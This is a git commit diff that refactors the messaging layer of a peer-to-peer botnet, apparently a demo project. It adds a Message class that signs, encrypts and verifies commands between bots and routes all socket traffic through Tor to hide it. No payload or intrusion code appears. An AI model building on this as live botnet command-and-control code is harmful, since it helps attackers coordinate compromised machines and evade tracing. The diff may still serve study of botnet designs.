676b57edc46dba355ecc993fd29f7aa53a47b6a3
danielorihuelarodriguez@gmail.com <danielorihuelarodriguez@gmail.com>
2020-03-17 23:48:02 +0100

    refactor: update demo

--- demo/public/source/botnet_p2p/comm_utils.py
+++ demo/public/source/botnet_p2p/comm_utils.py
@@ -11,13 +11,20 @@ from botnet_p2p import (
     MSG_SIGNEDHASH_SEPARATOR,
     logger,
 )
-from botnet_p2p.security import sign_hash, calculate_hash, verify_message, encrypt, decrypt
-from botnet_p2p.message import get_msg_data, get_msg_type, get_signed_hash
+from botnet_p2p.security import (
+    sign_hash,
+    calculate_hash,
+    verify_message,
+    encrypt,
+    decrypt,
+)
+from botnet_p2p.message import Message
 
 address = Tuple[str, int]
 
 # Set the proxy we will use so the socket messages go through tor
 socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
+
 
 class NodeP2P(object):
     """Socket wrapper to send and received signed messages"""
@@ -44,98 +51,65 @@ class NodeP2P(object):
         self.__private_key_path = private_key_path
 
     def bind(self, server_host: str, server_port: int):
+        logger.debug(f"Server binded to host = {server_host} and port = {server_port}")
         self.__socket.bind((server_host, server_port))
 
     def listen(self, max_queue_elements: int):
+        logger.debug(f"Server listening")
         self.__socket.listen(max_queue_elements)
 
     def accept(self) -> (socket.socket, address):
         client_socket, addr = self.__socket.accept()
+        logger.debug(f"New client accepted socket = {client_socket} and addr = {addr} ")
         return (
             NodeP2P(self.__public_key_path, self.__private_key_path, client_socket),
             addr,
         )
 
     def connect(self, server_host: str, server_port: int):
+        logger.debug(f"Connecting to server {server_host} at port {server_port}")
         self.__socket.connect((server_host, server_port))
 
     def close(self):
+        logger.debug(f"Closing connection")
         self.__socket.close()
 
-    def set_private_key_path(self, private_key_path: str):
-        """ Change private key path in case we want to use a different one 
-
-            Args:
-                private_key_path: Path were private key is located
-        """
-        self.__private_key_path = private_key_path
-
     def send_signed_msg(self, msg_type: int, msg: str):
-        final_msg = self.__build_msg_structure(msg_type, msg)
+        new_msg = Message(msg_type=msg_type, msg=msg)
+        final_msg = new_msg.sign_msg(self.__private_key_path)
+
+        logger.debug(f"Signed message being sent: {final_msg}")
+
         self.__socket.send(final_msg)
-    
+
     def send_encrypted_msg(self, msg: str):
         encrypted_msg = encrypt(self.__public_key_path, msg)
+
+        logger.debug(f"Encrypted message being sent: {encrypted_msg}")
+
         self.__socket.send(encrypted_msg)
 
     def recv_signed_msg(self) -> (int, str, bool):
         raw_msg = self.__socket.recv(BUFFER_SIZE)
-        msg_type, msg_data, signed_hash = self.__extract_info_from_message(raw_msg)
-        msg_type_data = f"{msg_type}{MSGTYPE_MSG_SEPARATOR}{msg_data}"
-        comes_from_trusted_source = verify_message(
-            self.__public_key_path, msg_type_data, signed_hash
+        received_msg = Message()
+        comes_from_trusted_source = received_msg.from_signed_msg(
+            raw_msg, self.__public_key_path
         )
+
         logger.debug(
-            f"Raw message: {raw_msg}"
+            f"Received signed message: {raw_msg}"
             + f"Comes from a trusted source? {comes_from_trusted_source}"
         )
-        return msg_type, msg_data, comes_from_trusted_source
-    
+
+        msg_type = received_msg.get_msg_type()
+        msg = received_msg.get_msg_body()
+
+        return msg_type, msg, comes_from_trusted_source
+
     def recv_encrypted_msg(self) -> str:
         encrypted_msg = self.__socket.recv(BUFFER_SIZE)
+
+        logger.debug(f"Received encrypted message: {encrypted_msg}")
+
         plain_msg = decrypt(self.__private_key_path, encrypted_msg)
         return plain_msg
-
-    def __build_msg_structure(self, msg_type: int, msg: str) -> bytes:
-        """ Build message following a structure so every bot in the P2P
-            can understand each other
-
-            Args:
-                msg_type: Type of the message you want to send
-                msg: The message itself
-
-            Returns:
-                Bytes in a structured format
-        """
-        msg = f"{msg_type}{MSGTYPE_MSG_SEPARATOR}{msg}"
-        msg_hash = calculate_hash(msg)
-        signed_hash = sign_hash(msg_hash, self.__private_key_path)
-        final_msg = (
-            msg.encode(ENCODING)
-            + f"{MSG_SIGNEDHASH_SEPARATOR}".encode(ENCODING)
-            + signed_hash
-        )
-        return final_msg
-
-    def __extract_info_from_message(self, raw_msg: bytes) -> (int, str, bytes):
-        """ Extract relevant fields from the received message knowing it
-            follows a specific structure
-
-            Args:
-                msg: Message in bytes
-
-            Returns:
-                The characteristic fields of the message:
-                message type, data and hash
-        """
-        raw_msg_str = raw_msg.decode(ENCODING)
-        msg_type = get_msg_type(raw_msg_str)
-        msg_data = get_msg_data(raw_msg_str)
-        signed_hash = get_signed_hash(raw_msg_str)
-        logger.debug(
-            f"  Message received: \n"
-            + f"  Message type: {msg_type}\n"
-            + f"  Message: {msg_data}\n"
-            + f"  Signed hash: {signed_hash}\n\n"
-        )
-        return msg_type, msg_data, signed_hash
--- demo/public/source/botnet_p2p/message.py
+++ demo/public/source/botnet_p2p/message.py
@@ -7,29 +7,111 @@ from botnet_p2p import (
     MSG_SIGNEDHASH_SEPARATOR,
 )
 
-
-def get_msg_type(msg: str) -> int:
-    msg_type, _ = msg.split(MSGTYPE_MSG_SEPARATOR)
-    try:
-        return int(msg_type)
-    except ValueError:
-        return BAD_MSG_TYPE
-
-
-def get_msg_data(msg: str) -> str:
-    """ Get the data of the message. The data is the real message
-        without the message type nor the signed hash
-
-        Args:
-            msg: Message
-
-        Returns:
-            The message itself
-    """
-    msg_data = msg.split(MSGTYPE_MSG_SEPARATOR)[1].split(MSG_SIGNEDHASH_SEPARATOR)[0]
-    return msg_data
+from botnet_p2p.security import (
+    calculate_hash,
+    sign_hash,
+    encrypt,
+    decrypt,
+    verify_message,
+)
 
 
-def get_signed_hash(msg: str) -> bytes:
-    _, signed_hash = msg.split(MSG_SIGNEDHASH_SEPARATOR)
-    return signed_hash.encode(ENCODING)
+class Message(object):
+    """Message with security features"""
+
+    def __init__(self, msg_type: int = None, msg: str = None):
+        if isinstance(msg_type, int):
+            self.__msg_type = msg_type
+        else:
+            self.__msg_type = BAD_MSG_TYPE
+
+        self.__msg = msg
+
+    def get_msg_type(self):
+        return self.__msg_type
+
+    def get_msg_body(self):
+        return self.__msg
+    
+    def get_signed_hash(self):
+        return self.__signed_hash
+
+    def sign_msg(self, private_key_path: str) -> bytes:
+        """ Build message following a structure so every bot in the P2P
+            can understand each other
+
+            Args:
+                private_key_path: Location of private key to sign
+
+            Returns:
+                Bytes in a structured format
+        """
+        type_msg_joined = self.__join_msg_type_and_msg()
+        msg_hash = calculate_hash(type_msg_joined)
+        signed_hash = sign_hash(msg_hash, private_key_path)
+        final_msg = (
+            type_msg_joined.encode(ENCODING)
+            + f"{MSG_SIGNEDHASH_SEPARATOR}".encode(ENCODING)
+            + signed_hash
+        )
+        return final_msg
+
+    def __join_msg_type_and_msg(self):
+        msg = f"{self.__msg_type}{MSGTYPE_MSG_SEPARATOR}{self.__msg}"
+        return msg
+
+    def from_signed_msg(self, structured_msg: bytes, public_key_path: str) -> bool:
+        """ A message following the required structured
+            will be received. Private variables will be
+            filled.
+
+            Args:
+                structured_msg: Message with specific structure
+                publick_key_path: Publick key location
+            
+            Return:
+                Whether the message can be trusted or not
+            
+            Raises:
+                cryptography.exceptions.InvalidSignature when signed hash
+                and hash do not match
+        """
+        structured_msg_decoded = structured_msg.decode(ENCODING)
+
+        self.__msg_type = self.__get_msg_type_from_signed_msg(structured_msg_decoded)
+        self.__msg = self.__get_msg_data_from_signed_msg(structured_msg_decoded)
+        self.__signed_hash = self.__get_signed_hash_from_signed_msg(structured_msg_decoded)
+
+        type_msg_join = self.__join_msg_type_and_msg()
+        return verify_message(public_key_path, type_msg_join, self.__signed_hash)
+
+    def __get_msg_type_from_signed_msg(self, msg: str) -> int:
+        msg_type, _ = msg.split(MSGTYPE_MSG_SEPARATOR)
+        try:
+            return int(msg_type)
+        except ValueError:
+            return BAD_MSG_TYPE
+
+    def __get_msg_data_from_signed_msg(self, msg: str) -> str:
+        """ Get the data of the message. The data is the real message
+            without the message type nor the signed hash
+
+            Args:
+                msg: Received text
+
+            Returns:
+                The message itself
+        """
+        msg_data = msg.split(MSGTYPE_MSG_SEPARATOR)[1].split(MSG_SIGNEDHASH_SEPARATOR)[
+            0
+        ]
+        return msg_data
+
+    def __get_signed_hash_from_signed_msg(self, msg: str) -> bytes:
+        _, signed_hash = msg.split(MSG_SIGNEDHASH_SEPARATOR)
+        return signed_hash.encode(ENCODING)
+
+    def __verify_sign(self, public_key_path: str) -> bool:
+        type_msg_joined = self.__join_msg_type_and_msg()
+        veredict = verify_message(public_key_path, type_msg_joined, self.__signed_hash)
+        return veredict
